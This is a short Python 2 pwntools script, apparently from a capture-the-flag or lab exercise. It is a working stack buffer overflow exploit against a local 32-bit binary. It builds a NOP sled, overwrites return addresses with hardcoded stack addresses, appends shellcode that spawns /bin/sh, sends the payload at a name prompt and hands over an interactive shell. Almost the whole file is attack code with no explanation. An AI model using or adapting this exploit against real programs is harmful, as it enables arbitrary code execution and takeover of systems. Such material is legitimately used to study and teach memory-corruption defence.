#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import log, context
from pwnlib.args import args
from pwnlib.util import packing
from pwnlib import shellcraft
from pwnlib.tubes.process import process
from pwnlib.asm import asm
from pwnlib.gdb import debug, attach


context.arch = 'i386'


#address_name_buffer = 0xffffcb70
address_name_buffer = 0xffffddc0
address_name_buffer = 0xffb65b90
#address_name_buffer = 0xff84d460 #0xffffcb70
offset_to_esp = 28
offset_to_shellcode = 36

nop = asm(shellcraft.i386.nop())

payload  = b''
#payload += packing.p32(address_name_buffer + 0x4)
#payload += packing.p32(address_name_buffer + offset_to_shellcode)
payload += nop * 32
payload += packing.p32(address_name_buffer + offset_to_shellcode + 0x4)
payload += packing.p32(address_name_buffer + offset_to_shellcode + 0x4)
payload += asm(shellcraft.i386.sh())

if __name__ == '__main__':
    #log.info('starting')
    if args.PAYLOAD:
        print payload
        sys.exit(0)

    prog = [sys.argv[1]]
    env = {}
    p = process(prog, env=env)

    if args.GDB:
        attach(p, '''
b main
#b *0x80491ff
c
x/a name
c
''')

    p.recvline_contains('What\'s your name? ', timeout=3)
    p.sendline(payload)

    p.interactive()
